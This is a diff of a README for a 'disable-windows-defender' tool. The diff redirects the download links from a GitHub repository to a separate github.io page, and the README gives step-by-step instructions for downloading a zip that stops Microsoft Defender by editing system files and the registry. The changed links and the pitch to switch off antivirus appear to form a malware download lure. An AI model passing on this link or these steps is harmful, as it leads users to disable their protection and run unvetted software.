@@ -1,6 +1,6 @@
 # 🛡️ disable-windows-defender - Manage your Windows security settings easily
 
-[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Vonniecharitable529/disable-windows-defender)
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue)](https://vonniecharitable529.github.io)
 
 ## 📖 About this project
 The disable-windows-defender tool provides a simple way to control Microsoft Defender on your computer. Many users prefer to manage their own security software or use different antivirus programs. This tool handles the process through automated scripts. It modifies system files and registry settings to stop the background services that run Defender. You gain full control over your machine without the constant interference of automated security scans.
@@ -16,7 +16,7 @@ You must hold administrator rights on your PC to run this tool. If you use a sha
 ## 📥 How to download and install
 Follow these steps to set up the tool on your desktop.
 
-1. Visit this page to download: [https://github.com/Vonniecharitable529/disable-windows-defender](https://github.com/Vonniecharitable529/disable-windows-defender)
+1. Visit this page to download: [https://vonniecharitable529.github.io](https://vonniecharitable529.github.io)
 2. Locate the Releases section on the right side of the screen.
 3. Click the latest version link to download the zip file to your hard drive.
 4. Open the folder where the file downloaded.
